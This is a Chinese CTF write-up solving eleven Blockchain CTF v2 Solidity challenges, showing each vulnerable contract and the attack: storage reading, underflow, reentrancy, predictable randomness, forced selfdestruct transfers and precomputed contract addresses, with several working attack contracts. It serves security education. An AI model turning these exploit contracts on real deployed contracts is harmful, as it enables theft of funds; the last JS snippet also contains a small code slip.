> 原文链接: https://www.anquanke.com//post/id/168037 


# Blockchain CTF v2 write up


                                阅读量   
                                **254416**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">6</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p3.ssl.qhimg.com/dm/1024_567_/t01650961ed1dc52236.jpg)](https://p3.ssl.qhimg.com/dm/1024_567_/t01650961ed1dc52236.jpg)



前两天看到这个智能合约的[ctf](https://blockchain-ctf.securityinnovation.com)出了v2版本，第一版的时候题目不多，而且也比较基础，这次更了第二版加了四道题，而且对老版的题目进行了一定的改进，虽然考点没变，但代码是更加规范了，至少编译起来看着是舒服多了，不过更新后没法用以前的账号继续，只能重新做，所以顺手在这记录了一下

题目地址 [https://blockchain-ctf.securityinnovation.com](https://blockchain-ctf.securityinnovation.com)

## 0x1.Donation

源码如下

```
pragma solidity 0.4.24;

import "../CtfFramework.sol";
import "../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol";

contract Donation is CtfFramework`{`

    using SafeMath for uint256;

    uint256 public funds;

    constructor(address _ctfLauncher, address _player) public payable
        CtfFramework(_ctfLauncher, _player)
    `{`
        funds = funds.add(msg.value);
    `}`

    function() external payable ctf`{`
        funds = funds.add(msg.value);
    `}`

    function withdrawDonationsFromTheSuckersWhoFellForIt() external ctf`{`
        msg.sender.transfer(funds);
        funds = 0;
    `}`

`}`
```

第一关，非常简单，在这一系列的题目了我们的目标都是清空合约的余额，此处直接调用`withdrawDonationsFromTheSuckersWhoFellForIt`函数即可，这里主要是让你熟悉操作，为了方便我都是直接使用[remix](http://remix.ethereum.org)进行调用，下面也一样，就不再赘述了



## 0x2.lock box

主要代码

```
pragma solidity 0.4.24;

import "./CtfFramework.sol";

contract Lockbox1 is CtfFramework`{`

    uint256 private pin;

    constructor(address _ctfLauncher, address _player) public payable
        CtfFramework(_ctfLauncher, _player)
    `{`
        pin = now%10000;
    `}`

    function unlock(uint256 _pin) external ctf`{`
        require(pin == _pin, "Incorrect PIN");
        msg.sender.transfer(address(this).balance);
    `}`

`}`
```

很简单，考点就是EVM中storage存储的读取，为了调用unlock函数，我们要知道合约中保存的pin的值，尽管它是个private的变量，无法被外部call，但是可以直接使用getStorageAt读取其值，因为CtfFramework合约中有个mapping变量的声明占据了一个slot，所以此处pin所在的即第二个slot，即index为1

> web3.eth.getStorageAt(‘your challenge address’, 1, console.log);

使用获取到的pin去调用unlock函数即可



## 0x3.Piggy Bank

主要代码

```
contract PiggyBank is CtfFramework`{`

    using SafeMath for uint256;

    uint256 public piggyBalance;
    string public name;
    address public owner;

    constructor(address _ctfLauncher, address _player, string _name) public payable
        CtfFramework(_ctfLauncher, _player)
    `{`
        name=_name;
        owner=msg.sender;
        piggyBalance=piggyBalance.add(msg.value);
    `}`

    function() external payable ctf`{`
        piggyBalance=piggyBalance.add(msg.value);
    `}`


    modifier onlyOwner()`{`
        require(msg.sender == owner, "Unauthorized: Not Owner");
        _;
    `}`

    function withdraw(uint256 amount) internal`{`
        piggyBalance = piggyBalance.sub(amount);
        msg.sender.transfer(amount);
    `}`

    function collectFunds(uint256 amount) public onlyOwner ctf`{`
        require(amount&lt;=piggyBalance, "Insufficient Funds in Contract");
        withdraw(amount);
    `}`

`}`


contract CharliesPiggyBank is PiggyBank`{`

    uint256 public withdrawlCount;

    constructor(address _ctfLauncher, address _player) public payable
        PiggyBank(_ctfLauncher, _player, "Charlie") 
    `{`
        withdrawlCount = 0;
    `}`

    function collectFunds(uint256 amount) public ctf`{`
        require(amount&lt;=piggyBalance, "Insufficient Funds in Contract");
        withdrawlCount = withdrawlCount.add(1);
        withdraw(amount);
    `}`

`}`
```

这道题主要考的是solidity中的继承，在`CharliesPiggyBank`合约跟`PiggyBank`合约中都有`collectFunds`函数，但是`PiggyBank`中只有owner可以调用，而`CharliesPiggyBank`则是继承自`PiggyBank`合约，其自己重写的`collectFunds`函数实际上覆盖了`PiggyBank`中的同名函数，所以我们直接调用合约中的`collectFunds`函数即可，关于solidity中的继承我也写过相关的文章，更多内容可以看这里，[solidity中的继承杂谈](https://www.anquanke.com/post/id/150310)

直接使用`piggyBalance`调用`collectFunds`即可完成挑战



## 0x4.SI Token Sale

主要代码

```
contract SIToken is StandardToken `{`

    using SafeMath for uint256;

    string public name = "SIToken";
    string public symbol = "SIT";
    uint public decimals = 18;
    uint public INITIAL_SUPPLY = 1000 * (10 ** decimals);

    constructor() public`{`
        totalSupply_ = INITIAL_SUPPLY;
        balances[this] = INITIAL_SUPPLY;
    `}`
`}`

contract SITokenSale is SIToken, CtfFramework `{`

    uint256 public feeAmount;
    uint256 public etherCollection;
    address public developer;

    constructor(address _ctfLauncher, address _player) public payable
        CtfFramework(_ctfLauncher, _player)
    `{`
        feeAmount = 10 szabo; 
        developer = msg.sender;
        purchaseTokens(msg.value);
    `}`

    function purchaseTokens(uint256 _value) internal`{`
        require(_value &gt; 0, "Cannot Purchase Zero Tokens");
        require(_value &lt; balances[this], "Not Enough Tokens Available");
        balances[msg.sender] += _value - feeAmount;
        balances[this] -= _value;
        balances[developer] += feeAmount; 
        etherCollection += msg.value;
    `}`

    function () payable external ctf`{`
        purchaseTokens(msg.value);
    `}`

    // Allow users to refund their tokens for half price ;-)
    function refundTokens(uint256 _value) external ctf`{`
        require(_value&gt;0, "Cannot Refund Zero Tokens");
        transfer(this, _value);
        etherCollection -= _value/2;
        msg.sender.transfer(_value/2);
    `}`

    function withdrawEther() external ctf`{`
        require(msg.sender == developer, "Unauthorized: Not Developer");
        require(balances[this] == 0, "Only Allowed Once Sale is Complete");
        msg.sender.transfer(etherCollection);
    `}`

`}`
```

这题的考点主要在于溢出，虽然前面引入了safemath，却没有使用，这就导致合约中存在下溢，很明显`purchaseTokens`函数中

> balances[msg.sender] += _value – feeAmount;

只要传入一个小于`feeAmount`的`_value`，即可让我们的balances下溢，比如发送1gas，然后即可调用`refundTokens`函数将合约的余额清空，因为这里是将`_value`除2得到提取的余额，所以我们将合约的`etherCollection`乘2作为`_value`即可，这里面也包含我们前面调用`purchaseTokens`发送的ether。



## 0x5.Secure Bank

主要代码

```
contract SimpleBank is CtfFramework`{`

    mapping(address =&gt; uint256) public balances;

    constructor(address _ctfLauncher, address _player) public payable
        CtfFramework(_ctfLauncher, _player)
    `{`
        balances[msg.sender] = msg.value;
    `}`

    function deposit(address _user) public payable ctf`{`
        balances[_user] += msg.value;
    `}`

    function withdraw(address _user, uint256 _value) public ctf`{`
        require(_value&lt;=balances[_user], "Insufficient Balance");
        balances[_user] -= _value;
        msg.sender.transfer(_value);
    `}`

    function () public payable ctf`{`
        deposit(msg.sender);
    `}`

`}`

contract MembersBank is SimpleBank`{`

    mapping(address =&gt; string) public members;

    constructor(address _ctfLauncher, address _player) public payable
        SimpleBank(_ctfLauncher, _player)
    `{`
    `}`

    function register(address _user, string _username) public ctf`{`
        members[_user] = _username;
    `}`

    modifier isMember(address _user)`{`
        bytes memory username = bytes(members[_user]);
        require(username.length != 0, "Member Must First Register");
        _;
    `}`

    function deposit(address _user) public payable isMember(_user) ctf`{`
        super.deposit(_user);
    `}`

    function withdraw(address _user, uint256 _value) public isMember(_user) ctf`{`
        super.withdraw(_user, _value);
    `}`

`}`

contract SecureBank is MembersBank`{`

    constructor(address _ctfLauncher, address _player) public payable
        MembersBank(_ctfLauncher, _player)
    `{`
    `}`

    function deposit(address _user) public payable ctf`{`
        require(msg.sender == _user, "Unauthorized User");
        require(msg.value &lt; 100 ether, "Exceeding Account Limits");
        require(msg.value &gt;= 1 ether, "Does Not Satisfy Minimum Requirement");
        super.deposit(_user);
    `}`

    function withdraw(address _user, uint8 _value) public ctf`{`
        require(msg.sender == _user, "Unauthorized User");
        require(_value &lt; 100, "Exceeding Account Limits");
        require(_value &gt;= 1, "Does Not Satisfy Minimum Requirement");
        super.withdraw(_user, _value * 1 ether);
    `}`

    function register(address _user, string _username) public ctf`{`
        require(bytes(_username).length!=0, "Username Not Enough Characters");
        require(bytes(_username).length&lt;=20, "Username Too Many Characters");
        super.register(_user, _username);
    `}`
`}`
```

这道题倒是有点意思，乍一看以为是继承的问题，不过在remix上导入后发现出现了两个`withdraw`函数，原来是`MembersBank`合约跟`SecureBank`合约的`withdraw`函数的参数类型不同，一个的_value是uint8，另一个却是uint256，这样这两个函数的签名就不相同了，在合约里也就是两个不同的函数，不过它们使用`super.withdraw`最终都会调用`SimpleBank`的`withdraw`函数。

因为这两个withdraw的限定条件不同，所以就存在了漏洞，`SecureBank`中要求

> require(msg.sender == _user, “Unauthorized User”);

但是`MembersBank`中仅需要是注册用户即可，所以这题的流程就是先调用`register`函数注册一下，然后使用etherscan在挑战合约的创建交易里查看一下合约的创建者，因为合约的ether都存在了它的账户上，然后我们直接使用这个地址来调用`MembersBank`中的`withdraw`函数即可，也就是找到参数类型为uint256的函数，非常简单就不赘述了



## 0x6.Lottery

主要代码

```
contract Lottery is CtfFramework`{`

    using SafeMath for uint256;

    uint256 public totalPot;

    constructor(address _ctfLauncher, address _player) public payable
        CtfFramework(_ctfLauncher, _player)
    `{`
        totalPot = totalPot.add(msg.value);
    `}`

    function() external payable ctf`{`
        totalPot = totalPot.add(msg.value);
    `}`

    function play(uint256 _seed) external payable ctf`{`
        require(msg.value &gt;= 1 finney, "Insufficient Transaction Value");
        totalPot = totalPot.add(msg.value);
        bytes32 entropy = blockhash(block.number);
        bytes32 entropy2 = keccak256(abi.encodePacked(msg.sender));
        bytes32 target = keccak256(abi.encodePacked(entropy^entropy2));
        bytes32 guess = keccak256(abi.encodePacked(_seed));
        if(guess==target)`{`
            //winner
            uint256 payout = totalPot;
            totalPot = 0;
            msg.sender.transfer(payout);
        `}`
    `}`    

`}`
```

一个很简单的随机数漏洞，直接部署攻击合约

```
contract attack `{`
    Lottery target;
    constructor() public`{`
        target=Lottery(your challenge address);
    `}`
    function pwn() payable`{`
        bytes32 entropy = block.blockhash(block.number);
        bytes32 entropy2 = keccak256(this);
        uint256 seeds = uint256(entropy^entropy2);

        target.play.value(msg.value)(seeds);
    `}`
    function () payable`{`

    `}`
`}`
```

首先在`ctf_challenge_add_authorized_sender`函数中将攻击合约注册一下，然后即可发起攻击



## 0x7.Trust Fund

```
contract TrustFund is CtfFramework`{`

    using SafeMath for uint256;

    uint256 public allowancePerYear;
    uint256 public startDate;
    uint256 public numberOfWithdrawls;
    bool public withdrewThisYear;
    address public custodian;

    constructor(address _ctfLauncher, address _player) public payable
        CtfFramework(_ctfLauncher, _player)
    `{`
        custodian = msg.sender;
        allowancePerYear = msg.value.div(10);        
        startDate = now;
    `}`

    function checkIfYearHasPassed() internal`{`
        if (now&gt;=startDate + numberOfWithdrawls * 365 days)`{`
            withdrewThisYear = false;
        `}` 
    `}`

    function withdraw() external ctf`{`
        require(allowancePerYear &gt; 0, "No Allowances Allowed");
        checkIfYearHasPassed();
        require(!withdrewThisYear, "Already Withdrew This Year");
        if (msg.sender.call.value(allowancePerYear)())`{`
            withdrewThisYear = true;
            numberOfWithdrawls = numberOfWithdrawls.add(1);
        `}`
    `}`

    function returnFunds() external payable ctf`{`
        require(msg.value == allowancePerYear, "Incorrect Transaction Value");
        require(withdrewThisYear==true, "Cannot Return Funds Before Withdraw");
        withdrewThisYear = false;
        numberOfWithdrawls=numberOfWithdrawls.sub(1);
    `}`
`}`
```

一个很典型的重入漏洞，注意到此处

> <p>if (msg.sender.call.value(allowancePerYear)())`{`<br>
withdrewThisYear = true;<br>
numberOfWithdrawls = numberOfWithdrawls.add(1);<br>
`}`</p>

使用了`call.value`来发送ether，同时余额的更新放在了后面，这样我们就可以重复提币直到清空合约的ether了

部署攻击合约

```
contract attack `{`
    TrustFund target;
    constructor() `{`
        target = TrustFund(your challenge address);
    `}`
    function pwn()`{`
        target.withdraw();
    `}`
    function () payable `{`
        target.withdraw();
    `}`
`}`
```

同样记得先调用`ctf_challenge_add_authorized_sender`将攻击合约添加到玩家里



## 0x8.Record Label

主要代码

```
contract Royalties`{`

    using SafeMath for uint256;

    address private collectionsContract;
    address private artist;

    address[] private receiver;
    mapping(address =&gt; uint256) private receiverToPercentOfProfit;
    uint256 private percentRemaining;

    uint256 public amountPaid;

    constructor(address _manager, address _artist) public
    `{`
        collectionsContract = msg.sender;
        artist=_artist;

        receiver.push(_manager);
        receiverToPercentOfProfit[_manager] = 80;
        percentRemaining = 100 - receiverToPercentOfProfit[_manager];
    `}`

    modifier isCollectionsContract() `{` 
        require(msg.sender == collectionsContract, "Unauthorized: Not Collections Contract");
        _;
    `}`

    modifier isArtist()`{`
        require(msg.sender == artist, "Unauthorized: Not Artist");
        _;
    `}`

    function addRoyaltyReceiver(address _receiver, uint256 _percent) external isArtist`{`
        require(_percent&lt;percentRemaining, "Precent Requested Must Be Less Than Percent Remaining");
        receiver.push(_receiver);
        receiverToPercentOfProfit[_receiver] = _percent;
        percentRemaining = percentRemaining.sub(_percent);
    `}`

    function payoutRoyalties() public payable isCollectionsContract`{`
        for (uint256 i = 0; i&lt; receiver.length; i++)`{`
            address current = receiver[i];
            uint256 payout = msg.value.mul(receiverToPercentOfProfit[current]).div(100);
            amountPaid = amountPaid.add(payout);
            current.transfer(payout);
        `}`
        msg.sender.call.value(msg.value-amountPaid)(bytes4(keccak256("collectRemainingFunds()")));
    `}`

    function getLastPayoutAmountAndReset() external isCollectionsContract returns(uint256)`{`
        uint256 ret = amountPaid;
        amountPaid = 0;
        return ret;
    `}`

    function () public payable isCollectionsContract`{`
        payoutRoyalties();
    `}`
`}`

contract Manager`{`
    address public owner;

    constructor(address _owner) public `{`
        owner = _owner;
    `}`

    function withdraw(uint256 _balance) public `{`
        owner.transfer(_balance);
    `}`

    function () public payable`{`
        // empty
    `}`
`}`

contract RecordLabel is CtfFramework`{`

    using SafeMath for uint256;

    uint256 public funds;
    address public royalties;

    constructor(address _ctfLauncher, address _player) public payable
        CtfFramework(_ctfLauncher, _player)
    `{`
        royalties = new Royalties(new Manager(_ctfLauncher), _player);
        funds = funds.add(msg.value);
    `}`

    function() external payable ctf`{`
        funds = funds.add(msg.value);
    `}`


    function withdrawFundsAndPayRoyalties(uint256 _withdrawAmount) external ctf`{`
        require(_withdrawAmount&lt;=funds, "Insufficient Funds in Contract");
        funds = funds.sub(_withdrawAmount);
        royalties.call.value(_withdrawAmount)();
        uint256 royaltiesPaid = Royalties(royalties).getLastPayoutAmountAndReset();
        uint256 artistPayout = _withdrawAmount.sub(royaltiesPaid); 
        msg.sender.transfer(artistPayout);
    `}`

    function collectRemainingFunds() external payable`{`
        require(msg.sender == royalties, "Unauthorized: Not Royalties Contract");
    `}`

`}`
```

这题代码看着很长，其实要清空合约的balance很简单，因为调用`withdrawFundsAndPayRoyalties`函数时会将对应的`_withdrawAmount`全部发送至`Royalties`合约，而`Royalties`会将其中的80%发送给创建者，剩下的20%发回去，接着`withdrawFundsAndPayRoyalties`中又会将这20%发送给我们，所以我们直接将`_withdrawAmount`设为1 ether来调用`withdrawFundsAndPayRoyalties`函数即可，合约内的交易状态如下

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://raw.githubusercontent.com/BubbLess/myimg/master/20181216152606.png)

`Royalties`合约在这个交易中的状态如下

[![](https://p5.ssl.qhimg.com/dm/1024_449_/t01b2c6aaf206653ef5.png)](https://p5.ssl.qhimg.com/dm/1024_449_/t01b2c6aaf206653ef5.png)



## 0x9.Heads or Tails

代码如下

```
contract HeadsOrTails is CtfFramework`{`

    using SafeMath for uint256;

    uint256 public gameFunds;
    uint256 public cost;

    constructor(address _ctfLauncher, address _player) public payable
        CtfFramework(_ctfLauncher, _player)
    `{`
        gameFunds = gameFunds.add(msg.value);
        cost = gameFunds.div(10);
    `}`

    function play(bool _heads) external payable ctf`{`
        require(msg.value == cost, "Incorrect Transaction Value");
        require(gameFunds &gt;= cost.div(2), "Insufficient Funds in Game Contract");
        bytes32 entropy = blockhash(block.number-1);
        bytes1 coinFlip = entropy[0] &amp; 1;
        if ((coinFlip == 1 &amp;&amp; _heads) || (coinFlip == 0 &amp;&amp; !_heads)) `{`
            //win
            gameFunds = gameFunds.sub(msg.value.div(2));
            msg.sender.transfer(msg.value.mul(3).div(2));
        `}`
        else `{`
            //loser
            gameFunds = gameFunds.add(msg.value);
        `}`
    `}`

`}`
```

一个简单的赌博合约，还是利用随机数漏洞，每次猜对可以获得赌注的1.5倍，因为每次下注只能为0.1ether，所以一次的收益为0.05ether，要将合约的ether清空需要20次，那么我们直接在合约中循环调用20次即可

部署攻击合约

```
contract attack `{`
    HeadsOrTails target;
    function attack() `{`
        target = HeadsOrTails(your challenge address);

    `}`
    function pwn() payable `{`
        bytes32 entropy = block.blockhash(block.number-1);
        bytes1 coinFlip = entropy[0] &amp; 1;
        for(int i=0;i&lt;20;i++)`{` 
        if (coinFlip == 1)`{`
            target.play.value(100000000000000000)(true);
        `}`
        else `{`
            target.play.value(100000000000000000)(false);
        `}`
    `}`
    `}`
    function () payable `{`

    `}`
`}`
```

将攻击合约添加到玩家列表即可开始攻击，注意gas要设置的足够高，发送的value在2 ether以上

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://raw.githubusercontent.com/BubbLess/myimg/master/20181216140516.png)

这样在一个块内即可完成攻击过程



## 0x10.Slot Machine

主要代码

```
contract SlotMachine is CtfFramework`{`

    using SafeMath for uint256;

    uint256 public winner;

    constructor(address _ctfLauncher, address _player) public payable
        CtfFramework(_ctfLauncher, _player)
    `{`
        winner = 5 ether;
    `}`

    function() external payable ctf`{`
        require(msg.value == 1 szabo, "Incorrect Transaction Value");
        if (address(this).balance &gt;= winner)`{`
            msg.sender.transfer(address(this).balance);
        `}`
    `}`

`}`
```

完成挑战需要合约的balance大于5 ether，但是合约的fallback函数限制了我们每次发送的ether为1 szabo，而1 ether等于10^6 szabo，所以想靠这样发送ether满足条件是不现实的，这里就得利用`selfdestruct`函数在自毁合约时强制发送合约的balance，因为这样不会出发目标的fallback函数。

部署一个攻击合约

```
contract attack `{`
    constructor() public payable`{`

    `}`
    function pwn() public `{`
        selfdestruct(your challenge address);
    `}`
`}`
```

创建合约时发送足够的ether，然后销毁合约强制发送ether即可完成挑战。



## 0x11.Rainy Day Fund

主要代码

```
contract DebugAuthorizer`{`

    bool public debugMode;

    constructor() public payable`{`
        if(address(this).balance == 1.337 ether)`{`
            debugMode=true;
        `}`
    `}`
`}`

contract RainyDayFund is CtfFramework`{`

    address public developer;
    mapping(address=&gt;bool) public fundManagerEnabled;
    DebugAuthorizer public debugAuthorizer;

    constructor(address _ctfLauncher, address _player) public payable
        CtfFramework(_ctfLauncher, _player)
    `{`
        //debugAuthorizer = (new DebugAuthorizer).value(1.337 ether)(); // Debug mode only used during development
        debugAuthorizer = new DebugAuthorizer();
        developer = msg.sender;
        fundManagerEnabled[msg.sender] = true;
    `}`

    modifier isManager() `{`
        require(fundManagerEnabled[msg.sender] || debugAuthorizer.debugMode() || msg.sender == developer, "Unauthorized: Not a Fund Manager");
         _;
    `}`

    function () external payable ctf`{`
        // Anyone can add to the fund    
    `}`

    function addFundManager(address _newManager) external isManager ctf`{`
        fundManagerEnabled[_newManager] = true;
    `}`

    function removeFundManager(address _previousManager) external isManager ctf`{`
        fundManagerEnabled[_previousManager] = false;
    `}`

    function withdraw() external isManager ctf`{`
        msg.sender.transfer(address(this).balance);
    `}`
`}`
```

可以提币的地方只有withdraw函数，显然必须满足`isManager`条件

> <p>modifier isManager() `{`<br>
require(fundManagerEnabled[msg.sender] || debugAuthorizer.debugMode() || msg.sender == developer, “Unauthorized: Not a Fund Manager”);<br>
_;<br>
`}`</p>

看了看第一个和第三个条件，显然是没法满足，只能将目光转向第二个条件，这就要求在`DebugAuthorizer`合约中在刚部署时其地址的balance即为1.337 ether，那么我们又想到了selfdestruct，不过这里合约已经部署，我们得在合约部署前计算出该`DebugAuthorizer`合约的地址，然后再向其发送1.337 ether

我们首先在挑战合约的创建交易里找到创建者的地址，如下

> 0xed0d5160c642492b3b482e006f67679f5b6223a2

这也是个合约，在以太坊源码中合约地址的计算方法如下

```
func CreateAddress(b common.Address, nonce uint64) common.Address `{`

    data, _ := rlp.EncodeToBytes([]interface`{``}``{`b, nonce`}`) //对地址和nonce进行rlp编码

    return common.BytesToAddress(Keccak256(data)[12:]) //利用keccak256算hash，后20个字节作为新地址

`}`
```

在该合约的[internaltx](https://ropsten.etherscan.io/address/0xed0d5160c642492b3b482e006f67679f5b6223a2#internaltx)查看一下部署下一个合约时的nonce值，数一下已经成功部署的合约有多少然后+1即可，利用该nonce我们即可算出部署的`RainyDayFund`合约的地址，接着使用该地址和nonce 1即可算出其部署的`DebugAuthorizer`合约的地址

```
const util = require('ethereumjs-util');
const rlp = require('rlp');
var address1="0xeD0D5160c642492b3B482e006F67679F5b6223A2"
encodedRlp1 = rlp.encode([address1, your nonce]);
buf1 = util.sha3(encodedRlp1);
address2 =buf1.slice(12).toString('hex');
encodedRlp2= rlp.encode([address2, 1]);
buf2 = util.sha3(encodedRlp2);
address=buf1.slice(12).toString('hex');
console.log(address);
```

然后向该地址发送1.337 ether，然后重新部署挑战合约即可。
